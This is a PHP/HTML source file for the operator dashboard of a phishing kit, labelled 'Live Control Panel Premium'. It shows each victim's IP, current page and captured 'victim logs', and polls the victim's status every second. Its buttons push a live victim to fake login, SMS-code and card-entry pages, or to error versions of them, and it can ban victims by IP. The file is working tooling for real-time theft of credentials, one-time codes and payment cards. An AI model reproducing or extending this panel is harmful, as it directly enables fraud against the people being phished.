<?php 
require "classes/Jeehan.class.php";


if(!isset($_SESSION['user']) OR $_SESSION['user']==""){
	exit(header("location: login.php"));
}

if(!isset($_GET['vid']) OR empty($_GET['vid'])){
	exit;
}
$j = new Jeehan();
$id = @$_GET['vid'];
$ip = $j->getUser("ip", $id);

if($j->getUser("current_page", $id)==null){
    	exit(header("location: index.php"));
}

?>
<!doctype html>
<html>
<head>
<title><?php echo $ip; ?></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, <b> <?php echo substr(PNL_USERNAME, 0, 8);?></b>
</div>
<div class="right">
<button onclick="window.location='index.php';"><i class='fa fa-home'></i> Home </button>
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
<button onclick="logout()"class="ban"><i class='fa fa-lock'></i> Log out</button>
</div>
</div>
<div class="content">
<div class="holder">
<div class="multi">
<div class="box1" id="statu" style="background:<?php if($j->getUser("last_act", $id)  > (time() - 5)){
		echo '#1bc81b';
	}else{
		echo '#b60f0f';
	} ?>">
<div class="rows-holder">
<div class="row">VICTIM IP: <?php echo $j->getUser("ip", $id); ?> </div>
</div>
</div>

<div class="box">
<div class="title">CURRENT PAGE</div>
<div class="content" id="current_page">
<?php 
$cp = $j->getUser("current_page", $id);
if(strpos($cp, "LOADING")!==false and $j->getUser("last_act", $id)  > (time() - 5)){
echo "<b style='color:red;'>Victim waiting for redirection... <br> $cp</b>";	
}else{
	echo $cp;
}
?>
</div>
</div>
<div class="box">
<div class="title">REDIRECTS</div>
<div class="content">
<button onclick="redirect(1)">LOGIN</button>
<button onclick="redirect(2)">LOGIN ERROR</button>
<button onclick="redirect(3)">SMS</button>
<button onclick="redirect(4)">SMS ERROR</button>
<button onclick="redirect(5)">CARD</button>
<button onclick="redirect(6)">CARD ERROR</button>
<button onclick="redirect(9)">SUCCESS</button>
</div>
</div>


<div class="box">
<div class="title">VICTIM LOGS</div>
<div class="content">
<textarea id="data" readonly><?php echo "\n".$j->getUser("data", $id); ?></textarea>
</div>
</div>
<div class="box">
<div class="title">ACTIONS</div>
<div class="content">
<button onclick="redirect(10)"> OFFICIAL WEBSITE <i class='fa-solid fa-arrow-right'></i> </button>
<button onclick="ban()" class="ban"> <i class='fa-solid fa-ban'></i> BAN</button>
</div>
</div>
</div>
</div>

<div class="loader" id="loader" style="display:none;">
<i class="fa fa-clock"></i> Redirecting...
</div>
<div class="loader" id="loader-adding" style="display:none;">
<i class="fa fa-clock"></i> Adding...
</div>
<div class="loader-error" id="errorbox" style="display:none;">
<i class="fa fa-ban"></i> <span id="error-msg"></span>
</div>
<div class="loader" id="successbox" style="display:none;">
<i class="fa fa-circle-check"></i> <span id="success-msg"></span>
</div>
<div class="loader-error" id="loader-error" style="display:none;">
<i class="fa fa-ban"></i> Victim is not connected
</div>
</div>


<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>
var vis_statu = "off";
var id = <?php echo $id; ?>;
var ip = "<?php echo $ip; ?>";

function redirect(page){
	if(vic_statu=="on"){
	$("#loader").show().delay(3000).fadeOut();
	$.post("process/processor.php", 
	{pageID:page, vicID:id} );
	}else{
		 $("#loader-error").show().delay(2000).fadeOut();
	}
}

function ban(){
	var conf = confirm("You sure want to block this victim (IP:"+ip+")?");
	if(conf){
	$.post("process/processor.php",{ban:ip}, function(done){
		alert(done);
	} );
	}
}


var textarea = document.getElementById('data');
var last_data = "";

setInterval(function(){
	$.post("process/processor.php", {getVictimData:1, vid:id}, 
	function(done){	
		const data = JSON.parse(done);
			if(data.page.includes('LOADING')==true && data.statu=="on"){
				$("#current_page").html("<b style='color:red;'>Victim waiting for redirection... <br>"+data.page+"</b>");
			}else{
			$("#current_page").html(data.page);
			}

		$("#data").val(data.data);
		if(last_data != data.data){
			textarea.scrollTop = textarea.scrollHeight;
		}
		last_data = data.data;
		
			vic_statu = data.statu;
		
		if(data.statu=="on"){
			$("#statu").css("background","#1bc81b");
		}else{
			$("#statu").css("background","#b60f0f");
		}

		
	});
}, 1000);


function showError(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#error-msg").html(msg);
	 $("#errorbox").show().delay(2000).fadeOut();
}
function showSuccess(msg){
	$(".loader").hide();
	$(".loader-error").hide();
	$("#success-msg").html(msg);
	 $("#successbox").show().delay(2000).fadeOut();
}

function addFour(){
	if($("#fourdigits").val()!=""){
		$("#loader-adding").show();
		$.post("process/processor.php",{dgt:$("#fourdigits").val(), id:id},function(){
			showSuccess("Numbers ["+$("#fourdigits").val()+"] Added!");
		});
	}else{
		showError("Please add numbers.");
	}
}


function logout(){
	window.location="index.php?logout";
}

</script>
</body>
</html>